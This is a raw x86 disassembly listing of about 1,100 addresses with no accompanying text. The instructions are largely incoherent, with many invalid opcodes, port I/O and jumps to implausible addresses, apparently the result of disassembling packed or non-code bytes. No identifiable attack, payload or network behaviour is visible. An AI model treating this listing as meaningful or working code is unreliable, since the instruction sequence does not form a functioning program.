  40abdf:	mov    ch,0x3d
  40abe1:	xchg   esi,eax
  40abe2:	cmc    
  40abe3:	dec    DWORD PTR [ebp-0x5]
  40abe6:	jb     0x40abe8
  40abe8:	mov    ch,0xea
  40abea:	mov    edi,DWORD PTR [ebx+eax*4-0x4dbf0a67]
  40abf1:	out    dx,eax
  40abf2:	into   
  40abf3:	add    BYTE PTR [ebp-0x486a7c6d],ah
  40abf9:	xchg   esi,eax
  40abfa:	cmc    
  40abfb:	(bad)  
  40abfc:	jp     0x40ab93
  40abfe:	sbb    BYTE PTR [eax],al
  40ac00:	gs xchg ebx,eax
  40ac02:	add    eax,0x898d284
  40ac07:	add    al,ah
  40ac09:	dec    dl
  40ac0b:	inc    BYTE PTR [edx-0x68]
  40ac0e:	add    DWORD PTR [edx-0x6f],0x28
  40ac12:	outs   dx,BYTE PTR ds:[esi]
  40ac13:	out    dx,al
  40ac14:	jb     0x40ac69
  40ac16:	mul    bh
  40ac18:	loope  0x40ac34
  40ac1a:	idiv   bh
  40ac1c:	sar    DWORD PTR ds:[ebx+0x2],cl
  40ac20:	dec    esi
  40ac21:	push   ds
  40ac22:	test   DWORD PTR [ebp-0xa6719],edx
  40ac28:	mov    al,ds:0x7d502255
  40ac2d:	mov    BYTE PTR [ebp+0x41],al
	...
  40ac44:	mov    WORD PTR [ebp+0x12],?
  40ac47:	push   edx
  40ac48:	xchg   esi,eax
  40ac49:	jge    0x40ac55
  40ac4b:	or     ecx,esp
  40ac4d:	outs   dx,DWORD PTR ds:[esi]
  40ac4e:	or     bl,ch
  40ac50:	add    BYTE PTR [bx-0x3e],ah
  40ac54:	cli    
  40ac55:	in     eax,0xc
  40ac57:	lea    ecx,[esi+0x31]
  40ac5a:	jae    0x40abe1
  40ac5c:	and    bh,dh
  40ac5e:	or     al,0xff
  40ac60:	je     0x40ac80
  40ac62:	mov    dl,0x40
  40ac64:	mov    esi,es
  40ac66:	xchg   BYTE PTR [ebx],cl
  40ac68:	in     al,0x25
  40ac6a:	js     0x40ac6b
  40ac6c:	retf   
  40ac6d:	aad    0x46
  40ac6f:	mov    ah,0xc2
  40ac71:	lods   eax,DWORD PTR ds:[esi]
  40ac72:	or     al,0x50
  40ac74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac75:	lds    esi,FWORD PTR [edi-0x1]
  40ac78:	mov    bl,0xf3
  40ac7a:	jbe    0x40ac2c
  40ac7c:	stos   BYTE PTR es:[edi],al
  40ac7d:	mov    ch,0xc
  40ac7f:	push   eax
  40ac80:	xor    al,0xe6
  40ac82:	scas   al,BYTE PTR es:[edi]
  40ac83:	inc    eax
  40ac84:	mov    WORD PTR [esi-0x626d4fba],es
  40ac8a:	or     al,0xe8
  40ac8c:	xchg   ebp,eax
  40ac8d:	adc    cl,BYTE PTR [edx]
  40ac8f:	add    BYTE PTR [edi-0x1bed7a45],dl
  40ac95:	enter  0x40ae,0x8c
  40ac99:	jle    0x40acdf
  40ac9b:	mov    al,0x6a
  40ac9d:	ja     0x40aca9
  40ac9f:	(bad)  
  40aca0:	fldenv [ebx-0x1e]
  40aca3:	js     0x40acfe
  40aca5:	inc    edi
  40aca6:	or     ch,al
	...
  40acbc:	aad    0xcd
  40acbe:	or     edi,edi
  40acc0:	sbb    DWORD PTR [ecx],eax
  40acc2:	iret   
  40acc3:	std    
  40acc4:	inc    ebx
  40acc5:	das    
  40acc6:	pop    ebp
  40acc7:	inc    DWORD PTR [ecx]
  40acc9:	call   0x5474abd8
  40acce:	loopne 0x40ad48
  40acd0:	mov    WORD PTR [edi+ebx*8+0x6c9de388],ss
  40acd7:	dec    ecx
  40acd8:	sbb    ebp,DWORD PTR [esi-0x61]
  40acdb:	add    ebx,ecx
  40acdd:	xor    BYTE PTR [esi-0x5782f4fd],al
  40ace3:	jge    0x40ac71
  40ace5:	xchg   esp,eax
  40ace6:	jbe    0x40aca1
  40ace8:	inc    ebx
  40ace9:	outs   dx,DWORD PTR ds:[esi]
  40acea:	jg     0x40acef
  40acec:	in     al,0xdb
  40acee:	push   ebp
  40acef:	add    ebp,ebx
  40acf1:	pop    ebx
  40acf2:	and    cl,BYTE PTR [esp+ecx*4]
  40acf5:	(bad)  
  40acf6:	jp     0x40ace8
  40acf8:	(bad)  
  40acfa:	jmp    0x40ace7
  40acfc:	std    
  40acfd:	add    al,BYTE PTR [edi+0x3]
  40ad00:	xchg   edi,eax
  40ad01:	push   esp
  40ad02:	mov    ah,0x12
  40ad04:	pop    esp
  40ad05:	les    esi,FWORD PTR [esi]
  40ad07:	jns    0x40ac8d
  40ad09:	jl     0x40ac96
  40ad0b:	add    dh,BYTE PTR [ebx+0x1a2b486d]
  40ad11:	outs   dx,BYTE PTR ds:[esi]
  40ad12:	das    
  40ad13:	int    0xcd
  40ad15:	pushf  
  40ad16:	fistp  WORD PTR [eax+0x7]
  40ad19:	and    DWORD PTR [ebx-0x38],0x6ddffa97
	...
  40ad34:	lods   eax,DWORD PTR ds:[esi]
  40ad35:	ins    DWORD PTR es:[edi],dx
  40ad36:	jne    0x40ad43
  40ad38:	je     0x40ad15
  40ad3a:	jp     0x40ad3f
  40ad3c:	jnp    0x40ad59
  40ad3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad3f:	jmp    ebp
  40ad41:	mov    ah,dh
  40ad43:	js     0x40acd9
  40ad45:	jl     0x40acf6
  40ad47:	add    ah,BYTE PTR [ebx+0x6d]
  40ad4a:	pop    edx
  40ad4b:	daa    
  40ad4c:	pop    ebx
  40ad4d:	out    0xe7,eax
  40ad4f:	jmp    0x40ad69
  40ad51:	ins    DWORD PTR es:[edi],dx
  40ad52:	mov    DWORD PTR [edx],0x78ce90b6
  40ad58:	xchg   esp,eax
  40ad59:	jl     0x40acf6
  40ad5b:	add    bh,BYTE PTR [ebx]
  40ad5d:	ins    DWORD PTR es:[edi],dx
  40ad5e:	or     DWORD PTR [ebx-0x78],eax
  40ad61:	cld    
  40ad62:	mov    ch,0xc
  40ad64:	rcl    DWORD PTR [eax+eiz*2+0x8d3ac4e],1
  40ad6b:	sahf   
  40ad6c:	push   esp
  40ad6d:	inc    ecx
  40ad6e:	inc    ecx
  40ad6f:	sub    BYTE PTR [eax-0x71860784],cl
  40ad75:	ins    DWORD PTR es:[edi],dx
  40ad76:	add    ch,BYTE PTR [ecx+0x1158887b]
  40ad7c:	sub    eax,0x5fe947d0
  40ad81:	ins    DWORD PTR es:[edi],dx
  40ad82:	jl     0x40ad65
  40ad84:	not    DWORD PTR [ebx-0xb]
  40ad87:	data16 mov ?,WORD PTR [eax+ecx*8+0x6c]
  40ad8c:	mov    gs,WORD PTR [ebp+0x63]
  40ad8f:	jmp    0xa8950afb
  40ad94:	(bad)  
  40ad95:	cld    
  40ad96:	lods   eax,DWORD PTR ds:[esi]
  40ad97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  40adac:	dec    eax
  40adad:	xchg   esp,eax
  40adae:	cmc    
  40adaf:	hlt    
  40adb0:	loop   0x40ad86
  40adb2:	inc    edi
  40adb3:	jmp    0x2eda005f
  40adb8:	mov    ds,WORD PTR [ecx-0x3b846238]
  40adbe:	pusha  
  40adbf:	jl     0x40aded
  40adc1:	ror    DWORD PTR [eax],cl
  40adc3:	mov    ecx,0x100e78e
  40adc8:	and    DWORD PTR [eax-0xa],esi
  40adcb:	push   es
  40adcc:	ja     0x40add4
  40adce:	test   dh,bh
  40add0:	(bad)  
  40add1:	dec    BYTE PTR [eax]
  40add3:	or     DWORD PTR [edi-0x2f731804],0xffffff94
  40adda:	pusha  
  40addb:	jmp    0xd1c9426f
  40ade0:	cmc    
  40ade1:	sbb    esi,esi
  40ade3:	(bad)  
  40ade4:	adc    DWORD PTR [ebp+edi*2+0x5],0xe0c4e0
  40adec:	jae    0x40adfb
  40adee:	idiv   edi
  40adf0:	ds pop eax
  40adf2:	jp     0x40ae08
  40adf4:	xchg   ebp,eax
  40adf5:	clc    
  40adf6:	xchg   ebx,eax
  40adf7:	pop    ebp
  40adf8:	je     0x40ad8a
  40adfa:	pop    eax
  40adfb:	inc    DWORD PTR [eax-0x6a31f68]
  40ae01:	xchg   ebp,eax
  40ae02:	cmc    
  40ae03:	call   0x37c961
  40ae08:	or     eax,0xaff83ce
  40ae0d:	xchg   esi,eax
  40ae0e:	jnp    0x40ae0c
	...
  40ae24:	jp     0x40ae09
  40ae26:	add    al,ch
  40ae28:	das    
  40ae29:	sbb    esi,edi
  40ae2b:	jmp    FWORD PTR [ebx+edx*2]
  40ae2e:	or     al,BYTE PTR [eax]
  40ae30:	and    BYTE PTR [ecx],bl
  40ae32:	loop   0x40adb5
  40ae34:	mov    cl,0x64
  40ae36:	(bad)  
  40ae37:	(bad)  
  40ae38:	cmp    bl,BYTE PTR [ebx]
  40ae3a:	dec    ebp
  40ae3b:	cld    
  40ae3c:	add    eax,0x4a107b95
  40ae41:	jecxz  0x40ae47
  40ae43:	call   0x499d0f
  40ae48:	scas   al,BYTE PTR es:[edi]
  40ae49:	push   edi
  40ae4a:	pop    es
  40ae4b:	test   DWORD PTR [esi-0x70],ebp
  40ae4e:	or     BYTE PTR [eax],al
  40ae50:	jb     0x40ae25
  40ae52:	lock add BYTE PTR [ebp-0x1f38f769],ah
  40ae59:	arpl   di,si
  40ae5b:	pop    es
  40ae5c:	jne    0x40adf5
  40ae5e:	bound  eax,QWORD PTR [eax]
  40ae60:	pop    ds
  40ae61:	xchg   edi,eax
  40ae62:	bound  eax,QWORD PTR [eax]
  40ae64:	pop    ds
  40ae65:	xchg   edi,eax
  40ae66:	add    DWORD PTR [ebp+0x71],0xffffffc7
  40ae6a:	add    DWORD PTR [ebp-0x8939f],0xffffffa5
  40ae71:	xchg   ebp,eax
  40ae72:	jnp    0x40ae6c
  40ae74:	cmp    ah,dl
  40ae76:	hlt    
  40ae77:	call   0xb23808
  40ae7c:	mov    WORD PTR [esi-0x36],?
  40ae7f:	jae    0x40ae0a
  40ae81:	inc    esp
  40ae82:	cwde   
  40ae83:	(bad)  
  40ae84:	cmp    edi,DWORD PTR [ebp+0x62]
  40ae87:	scas   eax,DWORD PTR es:[edi]
	...
  40ae9c:	les    edi,FWORD PTR [esp+ecx*1-0x1db25e01]
  40aea3:	test   ah,bh
  40aea5:	xor    DWORD PTR [ecx],ecx
  40aea7:	push   eax
  40aea8:	pop    es
  40aea9:	sub    eax,0xa188487
  40aeae:	or     edi,edi
  40aeb0:	pop    esp
  40aeb1:	scas   eax,DWORD PTR es:[edi]
  40aeb2:	in     al,0x74
  40aeb4:	sbb    al,0x12
  40aeb6:	or     DWORD PTR [ecx-0x10f12ef],ecx
  40aebc:	repz adc al,0xc5
  40aebf:	mov    ebp,ebx
  40aec1:	stc    
  40aec2:	arpl   WORD PTR [eax],ax
  40aec4:	je     0x40ae60
  40aec6:	push   0x41
  40aec8:	mov    edx,cs
  40aeca:	mov    esi,0x8c1dbef
  40aecf:	inc    DWORD PTR [ecx+0x49]
  40aed2:	loop   0x40aea1
  40aed4:	adc    edx,edx
  40aed6:	or     BYTE PTR [ecx-0x10f26ef],cl
  40aedc:	mov    bl,0xfd
  40aede:	mov    dh,0xeb
  40aee0:	mov    ds:0x180008b9,eax
  40aee5:	outs   dx,BYTE PTR ds:[esi]
  40aee6:	bound  eax,QWORD PTR [ecx]
  40aee8:	mov    WORD PTR [edx-0x6f260139],ds
  40aeee:	lock dec BYTE PTR [ebx+0x74087e9b]
  40aef5:	adc    al,0xbc
  40aef7:	(bad)  
  40aef8:	jnp    0x40af65
  40aefa:	mov    esp,0xf6637beb
  40aeff:	out    0x0,eax
	...
  40af11:	add    BYTE PTR [eax],al
  40af13:	add    BYTE PTR ds:0x63ff08c8,dl
  40af19:	xchg   ebp,eax
  40af1a:	xchg   esp,eax
  40af1b:	hlt    
  40af1c:	bound  ebp,QWORD PTR [edx-0x29]
  40af1f:	(bad)  
  40af20:	fcomp  DWORD PTR [eax+0x7c9479de]
  40af26:	adc    bh,bh
  40af28:	inc    edx
  40af29:	push   0xffffffcf
  40af2b:	mov    ecx,0xffb7622b
  40af30:	sub    edi,eax
  40af32:	imul   edi,edi,0x2a
  40af35:	push   0x2d
  40af37:	cld    
  40af38:	xor    al,0xd1
  40af3a:	scas   al,BYTE PTR es:[edi]
  40af3b:	call   FWORD PTR [edx]
  40af3d:	push   0x1d
  40af3f:	add    BYTE PTR [esp+ebx*1],ah
  40af42:	sbb    BYTE PTR [esp+ecx*4],al
  40af45:	pop    ebx
  40af46:	mov    ds:0x7abf8c10,al
  40af4b:	lock or al,0x51
  40af4e:	cwde   
  40af4f:	div    edx
  40af51:	imul   ebp,DWORD PTR [ebp+0x49],0x7966c4e8
  40af58:	jl     0x40afc3
  40af5a:	aad    0xf
  40af5c:	in     al,0xe5
  40af5e:	out    0x3,eax
  40af60:	mov    WORD PTR [ebp-0x74eef0e1],ds
  40af66:	loopne 0x40af6b
  40af68:	mov    WORD PTR [ecx-0x5b],ss
  40af6b:	sti    
  40af6c:	mov    ebx,0xcb03e069
  40af71:	iret   
  40af72:	xor    edi,edi
  40af74:	xchg   edx,eax
  40af75:	xchg   esp,eax
  40af76:	fild   QWORD PTR [ecx+0x0]
	...
  40af89:	add    BYTE PTR [eax],al
  40af8b:	add    BYTE PTR [esi+edi*8-0x1739621],cl
  40af92:	fist   WORD PTR [eax-0x6f4f9fb8]
  40af98:	adc    BYTE PTR [eax+0x1f],ah
  40af9b:	inc    DWORD PTR [edx+0x74790ec4]
  40afa1:	imul   edi,DWORD PTR [ebp-0x1],0x7108cf6b
  40afa8:	(bad)  
  40afa9:	xchg   esp,eax
  40afaa:	add    DWORD PTR [ecx],ebp
  40afac:	in     al,0x8f
  40afae:	(bad)  
  40afb0:	(bad)  
  40afb1:	xchg   esp,eax
  40afb2:	or     BYTE PTR [ecx+0x23],dl
  40afb5:	rol    DWORD PTR [edi-0x17],1
  40afb8:	dec    edx
  40afb9:	loopne 0x40afd3
  40afbb:	rcr    DWORD PTR [ecx],0x1a
  40afbe:	test   dh,0xdf
  40afc1:	sbb    eax,0x65046cd9
  40afc6:	(bad)  
  40afc7:	mov    dh,0x2a
  40afc9:	fstp   DWORD PTR [edx-0x3f]
  40afcc:	or     DWORD PTR [edx],ebx
  40afce:	mul    BYTE PTR [esi-0x6906eff8]
  40afd4:	adc    ch,BYTE PTR [edx-0x1f]
  40afd7:	mov    ch,0x16
  40afd9:	push   0xfffffff6
  40afdb:	add    ecx,DWORD PTR [eax+0x348608fe]
  40afe1:	jns    0x40afe1
  40afe3:	jle    0x40afd7
  40afe5:	imul   edi,DWORD PTR [ebp+eiz*8-0x9],0xe26e8772
  40afed:	sbb    ecx,DWORD PTR [ebp+edx*2+0x0]
	...
  40b004:	loop   0x40b06f
  40b006:	neg    BYTE PTR [esi+0x14]
  40b009:	jge    0x40b009
  40b00b:	push   esi
  40b00c:	retf   0x8270
  40b00f:	je     0x40afd3
  40b011:	imul   eax,DWORD PTR [edx],0x58f54329
  40b017:	jo     0x40b01d
  40b019:	jno    0x40b019
  40b01b:	ss stos BYTE PTR es:[edi],al
  40b01d:	imul   edi,DWORD PTR [ecx+eax*2+0x11f6699a],0x1ef618c7
  40b028:	xchg   BYTE PTR [ebp+edi*2-0x5f],dl
  40b02c:	not    DWORD PTR [edx-0xfbf01f8]
  40b032:	mov    eax,ds:0x8d13300
  40b037:	(bad)  
  40b038:	mov    eax,0x62ffff7b
  40b03d:	push   0x7d
  40b03f:	or     BYTE PTR [ebp+0x72ffbce8],cl
  40b045:	stc    
  40b046:	or     al,BYTE PTR [eax]
  40b048:	inc    edx
  40b049:	daa    
  40b04a:	outs   dx,BYTE PTR ds:[esi]
  40b04b:	mov    ebx,0xff08d383
  40b050:	sbb    BYTE PTR [ecx-0x1],bh
  40b053:	call   DWORD PTR [edx+0x6a]
  40b056:	jge    0x40b060
  40b058:	pop    ebp
  40b059:	hlt    
  40b05a:	mov    esp,0x8f8e2ff
  40b05f:	add    dl,ah
  40b061:	outs   dx,BYTE PTR es:[esi]
  40b063:	call   eax
  40b065:	ror    DWORD PTR [eax],cl
  40b067:	inc    DWORD PTR [eax]
	...
  40b079:	add    BYTE PTR [eax],al
  40b07b:	add    BYTE PTR [eax+0x22ffff78],bh
  40b081:	push   0x7d
  40b083:	or     BYTE PTR ds:0x12ffbcdc,cl
  40b089:	jns    0x40b0e3
  40b08b:	mov    esi,DWORD PTR [edx+0x69]
  40b08e:	div    DWORD PTR [ebp-0x89def]
  40b094:	or     eax,0x72ff81d2
  40b099:	imul   edi,DWORD PTR [ebp-0x896c510],0xf597e8ff
  40b0a3:	jne    0x40b052
  40b0a5:	jnp    0x40b07c
  40b0a7:	(bad)  
  40b0a8:	push   edx
  40b0a9:	imul   esi,edi,0xf76175b5
  40b0af:	dec    DWORD PTR [ebp-0x43]
  40b0b2:	cmp    edi,0xf84d6972
  40b0b8:	jl     0x40b11d
  40b0ba:	hlt    
  40b0bb:	push   DWORD PTR [edx+0x69]
  40b0be:	jge    0x40b0bc
  40b0c0:	mov    WORD PTR [ebp+0x7d8c774b],ss
  40b0c6:	ret    
  40b0c7:	ror    DWORD PTR [eax+0x608b5f7d],0xfa
  40b0ce:	sar    bl,0xf6
  40b0d1:	jge    0x40b133
  40b0d3:	and    ah,BYTE PTR [ebx-0x20]
  40b0d6:	add    eax,ebp
  40b0d8:	cdq    
  40b0d9:	in     eax,0xf4
  40b0db:	inc    BYTE PTR ds:0x6808b0
	...
  40b0f1:	add    BYTE PTR [eax],al
  40b0f3:	add    BYTE PTR [ebp+edi*2+0x56b4bde5],cl
  40b0fa:	push   edi
  40b0fb:	inc    ecx
  40b0fc:	mov    ebp,es
  40b0fe:	add    ebx,DWORD PTR [esi-0x33]
  40b101:	jge    0x40b0f8
  40b103:	je     0x40b099
  40b105:	push   ebp
  40b106:	and    dh,BYTE PTR [ebx+eiz*1-0x45e89dca]
  40b10d:	mov    esp,0x2a59ff0c
  40b112:	inc    edx
  40b113:	inc    ecx
  40b114:	mov    esi,?
  40b116:	jle    0x40b120
  40b118:	hlt    
  40b119:	in     al,dx
  40b11a:	idiv   dh
  40b11c:	sti    
  40b11d:	test   BYTE PTR [ebx],bl
  40b11f:	pop    esi
  40b120:	dec    ebp
  40b121:	jge    0x40b185
  40b123:	add    cl,BYTE PTR [ebp+edi*2+0x7559fe8a]
  40b12a:	loop   0x40b1a9
  40b12c:	fldln2 
  40b12e:	hlt    
  40b12f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b131:	daa    
  40b132:	dec    ebx
  40b133:	add    BYTE PTR [ebx+edi*2],dh
  40b136:	or     al,BYTE PTR [eax]
  40b138:	or     al,0xd6
  40b13a:	jle    0x40b144
  40b13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b13d:	xor    esp,esi
  40b13f:	(bad)  
  40b140:	mov    bl,0x44
  40b142:	popa   
  40b143:	pop    esi
  40b144:	dec    ebp
  40b145:	jge    0x40b1a9
  40b147:	add    cl,BYTE PTR [ebp+edi*2-0x6bde0176]
  40b14e:	imul   ebx
  40b150:	inc    esp
  40b151:	popw   ss
  40b153:	cld    
  40b154:	mov    ah,al
  40b156:	sbb    edi,esp
	...
  40b16c:	clc    
  40b16d:	pushf  
  40b16e:	pop    es
  40b16f:	push   ss
  40b170:	add    al,0x66
  40b172:	bswap  edx
  40b174:	dec    ebp
  40b175:	xchg   ecx,eax
  40b176:	fist   WORD PTR [esi+0x17]
  40b179:	jns    0x40b17a
  40b17b:	jne    0x40b10d
  40b17d:	jl     0x40b17f
  40b17f:	lea    ebx,[edx+0x66]
  40b182:	sti    
  40b183:	ret    
  40b184:	fild   QWORD PTR [ebx-0x2c161fa9]
  40b18a:	fist   WORD PTR [ebx+0x34]
  40b18d:	stc    
  40b18e:	push   ebp
  40b18f:	sti    
  40b190:	cmp    al,ch
  40b192:	(bad)  
  40b194:	mov    WORD PTR [esi+eax*8+0x1e4db3ba],ss
  40b19b:	inc    ebp
  40b19c:	mov    esp,es
  40b19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b19f:	jno    0x40b125
  40b1a1:	jl     0x40b1d9
  40b1a3:	mov    bh,0x12
  40b1a5:	dec    ax
  40b1a7:	ins    BYTE PTR es:[edi],dx
  40b1a8:	lea    edx,[esi+ecx*4+0x263e6bba]
  40b1af:	inc    ebp
  40b1b0:	mov    esp,es
  40b1b2:	mov    ?,WORD PTR [ecx-0x7c]
  40b1b5:	jl     0x40b1d9
  40b1b7:	mov    bh,0xea
  40b1b9:	mov    BYTE PTR gs:[edi+0x16],cl
  40b1bd:	data16 addr16 int 0xcd
  40b1c1:	pushf  
  40b1c2:	fist   WORD PTR [eax+0x7]
  40b1c5:	jns    0x40b22a
  40b1c7:	rol    bh,0xfa
  40b1ca:	fild   QWORD PTR [ebp+0x6f]
  40b1cd:	fisttp QWORD PTR gs:[ebx]
	...
  40b1e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1e5:	mul    DWORD PTR [esi-0x5]
  40b1e8:	mov    dl,0x1b
  40b1ea:	lods   eax,DWORD PTR ds:[esi]
  40b1eb:	div    DWORD PTR ds:0x1d36088a
  40b1f1:	pushf  
  40b1f2:	loopne 0x40b248
  40b1f4:	xchg   edi,eax
  40b1f5:	data16 not BYTE PTR [ebx-0xe839a96]
  40b1fc:	ja     0x40b218
  40b1fe:	not    BYTE PTR [esi]
  40b200:	xchg   ebx,edi
  40b202:	adc    al,0xe
  40b204:	std    
  40b205:	pushf  
  40b206:	loopne 0x40b270
  40b208:	ja     0x40b270
  40b20a:	idiv   dh
  40b20c:	fsubr  QWORD PTR [eax-0xa]
  40b20f:	jl     0x40b1a8
  40b211:	jl     0x40b1a1
  40b213:	push   di
  40b215:	data16 shr BYTE PTR [ebx+0x725d6553],0x33
  40b21d:	ret    0xeccd
  40b220:	and    eax,0x8fe947c5
  40b225:	xchg   esp,eax
  40b226:	or     cl,ch
  40b228:	bound  ecx,QWORD PTR [ecx-0xa]
  40b22b:	xor    al,0x98
  40b22d:	jl     0x40b1f9
  40b22f:	cmp    eax,0x14819488
  40b234:	mov    BYTE PTR [ecx],dl
  40b236:	icebp  
  40b237:	jmp    0x40b1d6
  40b239:	or     DWORD PTR [ecx],0xffffffb9
  40b23c:	adc    bh,BYTE PTR [ebx+0xb]
  40b23f:	wbinvd 
  40b241:	stos   DWORD PTR es:[edi],eax
  40b242:	push   esp
  40b243:	sub    eax,0xae6e8f7d
	...
  40b25c:	mov    eax,ecx
  40b25e:	or     BYTE PTR [esi+0x5c],bh
  40b261:	cwde   
  40b262:	loopne 0x40b257
  40b264:	pop    esp
  40b265:	xchg   esp,eax
  40b266:	or     BYTE PTR [ecx],al
  40b268:	adc    eax,esi
  40b26a:	inc    edi
  40b26b:	jmp    0xa89813d7
  40b270:	(bad)  
  40b271:	jl     0x40b2a6
  40b273:	jge    0x40b23b
  40b275:	add    ch,BYTE PTR gs:[ecx]
  40b278:	sub    ebp,edi
  40b27a:	cmc    
  40b27b:	add    al,dh
  40b27d:	cwde   
  40b27e:	cmc    
  40b27f:	adc    eax,0x47ca36
  40b284:	ss and eax,0xe4650b0a
  40b28a:	pop    ebx
  40b28b:	call   DWORD PTR [eax+0x754156fd]
  40b291:	cmp    edx,DWORD PTR [eax+eiz*2+0x3d899834]
  40b298:	jmp    0x40b291
  40b29a:	inc    edi
  40b29b:	add    BYTE PTR [ebp-0x1b],ah
  40b29e:	add    bh,bh
  40b2a0:	inc    eax
  40b2a1:	pop    ss
  40b2a2:	push   edi
  40b2a3:	inc    ecx
  40b2a4:	jne    0x40b319
  40b2a6:	xor    DWORD PTR [edx+0x65],ebp
  40b2a9:	repnz pop es
  40b2ab:	push   DWORD PTR [eax-0x2]
  40b2ae:	push   ebp
  40b2af:	inc    ecx
  40b2b0:	xor    eax,0x7a971d5d
  40b2b5:	xlat   BYTE PTR ds:[ebx]
  40b2b6:	or     BYTE PTR [ebx-0x3ffe730f],al
  40b2bc:	jno    0x40b275
  40b2be:	cmc    
  40b2bf:	xor    eax,0x0
	...
  40b2d4:	retf   
  40b2d5:	clc    
  40b2d6:	inc    edi
  40b2d7:	add    dl,bl
  40b2d9:	xchg   ebx,eax
  40b2da:	xchg   ebp,eax
  40b2db:	pop    edi
  40b2dc:	fs cwde 
  40b2de:	mov    esp,eax
  40b2e0:	and    DWORD PTR [ebp+0x1d],ebx
  40b2e3:	xchg   edx,ecx
  40b2e5:	xlat   BYTE PTR ds:[ebx]
  40b2e6:	or     bh,al
  40b2e8:	lock std 
  40b2ea:	push   ebp
  40b2eb:	inc    ecx
  40b2ec:	in     eax,0x97
  40b2ee:	or     BYTE PTR [eax],al
  40b2f0:	in     eax,0x70
  40b2f2:	or     DWORD PTR [ebx+0x5e],eax
  40b2f5:	pop    ecx
  40b2f6:	push   ebx
  40b2f7:	leave  
  40b2f8:	aaa    
  40b2f9:	xchg   ecx,eax
  40b2fa:	or     BYTE PTR [ebx+0x4155fe28],al
  40b300:	in     eax,0x97
  40b302:	jl     0x40b323
  40b304:	push   0xffffffb3
  40b306:	xchg   esi,eax
  40b307:	pusha  
  40b308:	mov    WORD PTR [edx+ecx*1],gs
  40b30b:	jmp    DWORD PTR [ecx-0x73beb00e]
  40b311:	out    dx,al
  40b312:	enter  0xab03,0x48
  40b316:	mov    DWORD PTR [esi+0x4d],ebx
  40b319:	ins    DWORD PTR es:[edi],dx
  40b31a:	leave  
  40b31b:	add    al,0xfa
  40b31d:	dec    ebp
  40b31e:	dec    ebx
  40b31f:	add    BYTE PTR [ebp+ebp*2+0x284f000a],cl
  40b326:	test   ebx,ebp
  40b328:	cmpxchg esp,edi
  40b32b:	push   edx
  40b32c:	pop    es
  40b32d:	cmp    BYTE PTR [edx],al
  40b32f:	or     ecx,DWORD PTR [ecx+eiz*8+0x4]
  40b333:	sub    ecx,0x71
  40b336:	or     dh,BYTE PTR [eax+eax*1+0x0]
	...
  40b34a:	add    BYTE PTR [eax],al
  40b34c:	mov    ebp,ebp
  40b34e:	xor    al,0x0
  40b350:	loope  0x40b3cc
  40b352:	and    eax,0xcc24b7c0
  40b357:	pop    es
  40b358:	mov    ebp,gs
  40b35a:	xor    DWORD PTR [esi-0x48],edi
  40b35d:	pop    ebp
  40b35e:	lea    edi,[edx+ebx*1]
  40b361:	int    0x49
  40b363:	add    BYTE PTR [eax+eiz*4-0x49b3d4f9],cl
  40b36a:	rol    ecx,0x94
  40b36d:	ins    DWORD PTR es:[edi],dx
  40b36e:	mov    dh,BYTE PTR [edi]
  40b370:	call   0x4469:0xb98b32a8
  40b377:	sub    esi,0x6d
  40b37a:	add    eax,0x8d7379d2
  40b37f:	jl     0x40b309
  40b381:	ins    BYTE PTR es:[edi],dx
  40b382:	addr16 add al,0xa7
  40b385:	sub    eax,0xafeb23e5
  40b38a:	add    BYTE PTR [ebx-0x886b7],cl
  40b390:	(bad)  
  40b391:	ins    DWORD PTR es:[edi],dx
  40b392:	or     al,cl
  40b394:	in     al,dx
  40b395:	xchg   ebx,eax
  40b396:	loope  0x40b3eb
  40b398:	mov    ah,0x3b
  40b39a:	js     0x40b394
  40b39c:	ret    0x6ac3
  40b39f:	dec    esi
  40b3a0:	test   dh,dl
  40b3a2:	scas   eax,DWORD PTR es:[edi]
  40b3a3:	clc    
  40b3a4:	cmp    BYTE PTR [eax+0x79deb91],dl
  40b3aa:	aaa    
  40b3ab:	clc    
  40b3ac:	cmp    edi,DWORD PTR [edi+0xc528]
	...
  40b3c2:	add    BYTE PTR [eax],al
  40b3c4:	xchg   ebx,eax
  40b3c5:	xchg   esp,eax
  40b3c6:	or     bl,ch
  40b3c8:	xchg   edx,eax
  40b3c9:	call   0x8d41acc9
  40b3ce:	cdq    
  40b3cf:	add    esi,esi
  40b3d1:	xchg   esp,eax
  40b3d2:	push   ds
  40b3d3:	push   cs
  40b3d4:	pop    es
  40b3d5:	ret    0x3a0
  40b3d8:	mulps  xmm2,xmm0
  40b3db:	or     al,0x4c
  40b3dd:	jmp    0x61093e6e
  40b3e2:	mov    al,BYTE PTR [edi]
  40b3e4:	or     eax,ebx
  40b3e6:	out    dx,eax
  40b3e7:	push   edx
  40b3e8:	fs es js 0x40b3e3
  40b3ec:	dec    edx
  40b3ed:	out    dx,eax
  40b3ee:	fisttp WORD PTR [eax-0x8cf9b38]
  40b3f4:	shl    BYTE PTR [eax-0x39],0x11
  40b3f8:	pop    ss
  40b3f9:	ret    0x420
  40b3fc:	mulps  xmm4,xmm4
  40b3ff:	or     cl,BYTE PTR [eax+ebp*8-0xe]
  40b403:	mov    al,dl
  40b405:	arpl   WORD PTR fs:[eax+ecx*4-0x6c],di
  40b40a:	adc    ebx,DWORD PTR [ebx]
  40b40c:	pop    ss
  40b40d:	aad    0xf7
  40b40f:	inc    ebx
  40b410:	pop    esp
  40b411:	ins    BYTE PTR es:[edi],dx
  40b412:	adc    ecx,DWORD PTR [edx+edi*8+0xdc6b61]
  40b419:	fsubr  DWORD PTR [edi-0x9]
  40b41c:	jnp    0x40b3aa
  40b41e:	adc    dh,bh
  40b420:	jae    0x40b3ba
  40b422:	or     BYTE PTR [ecx+0x6ef619f9],al
	...
  40b43c:	xchg   sp,ax
  40b43e:	sub    DWORD PTR [edi+edi*4+0xaf4f5d1],0xffffffc3
  40b446:	inc    edi
  40b447:	jmp    0xc3420a5a
  40b44c:	mov    BYTE PTR [ecx+0x7c],ah
  40b44f:	inc    ebp
  40b450:	mov    ds:0x489e8588,eax
  40b455:	xchg   esp,eax
  40b456:	mov    DWORD PTR ds:0x92ca0d88,ebp
  40b45c:	rcl    BYTE PTR [ebx+0x1],0xe9
